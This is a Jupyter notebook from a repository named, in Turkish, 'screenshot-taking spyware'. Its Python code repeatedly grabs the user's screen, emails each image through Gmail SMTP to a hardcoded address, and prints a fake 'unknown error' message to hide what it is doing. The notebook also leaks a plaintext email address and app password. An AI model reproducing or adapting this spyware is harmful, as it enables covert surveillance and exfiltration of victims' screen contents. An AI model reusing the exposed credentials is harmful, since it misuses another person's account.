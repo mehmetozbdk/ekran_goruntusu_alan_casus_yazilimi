{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "8ef5917d",
   "metadata": {},
   "outputs": [],
   "source": [
    "import time\n",
    "import email, smtplib, ssl\n",
    "from email import encoders # Ekran görüntüsünü base 64 dizesine dönüştürme\n",
    "from email.mime.base import MIMEBase # e-posta mesajlarında ekleri göndermek için kullanılır.\n",
    "from email.mime.multipart import MIMEMultipart # MIMEMultipart nesnesi, nesneleri yönetir ve tek bir mesajda birleştirir.\n",
    "from PIL import ImageGrab # ekran goruntusu ceken kutuphane\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "b88998e9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Lütfen bekleyin bilinmiyen bir hata Çıktı...\n"
     ]
    }
   ],
   "source": [
    "gondericiEmail = \"mehmetozbdk.6384@gmail.com\"\n",
    "aliciEmail = \"mehmetozbdk.6384@gmail.com\"\n",
    "password = 'nficwxxynkuvzbtc'\n",
    "\n",
    "count = 0\n",
    "\n",
    "def ekranGoruntuAlanFnk():\n",
    "\n",
    "    filename = f\"ekrangoruntusu{count}.png\"\n",
    "    snapshot = ImageGrab.grab() # Take snap\n",
    "\n",
    "    snapshot.save(filename)  \n",
    "\n",
    "    message = MIMEMultipart()\n",
    "    message[\"From\"] = gondericiEmail\n",
    "    message[\"To\"] = aliciEmail\n",
    "    message[\"Subject\"] = 'Ekran görüntüsü'\n",
    "\n",
    "\n",
    "\n",
    "    with open(filename, \"rb\") as attachment:\n",
    "                    part = MIMEBase(\"image\", \"png\")\n",
    "                    part.set_payload(attachment.read())\n",
    "                    encoders.encode_base64(part)\n",
    "\n",
    "    part.add_header(\"Content-Disposition\",f\"attachment; filename= {filename}\",)\n",
    "\n",
    "    message.attach(part)\n",
    "    text = message.as_string()\n",
    "\n",
    "    try:                \n",
    "        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:\n",
    "\n",
    "                         server.login(gondericiEmail, password)  \n",
    "                         server.sendmail(gondericiEmail,aliciEmail, text)\n",
    "                         #print('Mail başarıyla gönderildi!')\n",
    "    except Exception as e:\n",
    "        print(f'Hata: {e}')\n",
    "        \n",
    "        \n",
    "print('Lütfen bekleyin bilinmiyen bir hata Çıktı...')  \n",
    "\n",
    "while(True):\n",
    "    #print('Süre bekleniyor...')\n",
    "    \n",
    "    time.sleep(10) # 10 sn\n",
    "    count += 1\n",
    "    ekranGoruntuAlanFnk()\n",
    "    #print(\"ekranG:\",count)\n",
    "    if(count == 3):\n",
    "        #print('Bitti...')\n",
    "        break\n",
    "        \n",
    "      "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0f89dc71",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.8"
  },
  "varInspector": {
   "cols": {
    "lenName": 16,
    "lenType": 16,
    "lenVar": 40
   },
   "kernels_config": {
    "python": {
     "delete_cmd_postfix": "",
     "delete_cmd_prefix": "del ",
     "library": "var_list.py",
     "varRefreshCmd": "print(var_dic_list())"
    },
    "r": {
     "delete_cmd_postfix": ") ",
     "delete_cmd_prefix": "rm(",
     "library": "var_list.r",
     "varRefreshCmd": "cat(var_dic_list()) "
    }
   },
   "types_to_exclude": [
    "module",
    "function",
    "builtin_function_or_method",
    "instance",
    "_Feature"
   ],
   "window_display": false
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
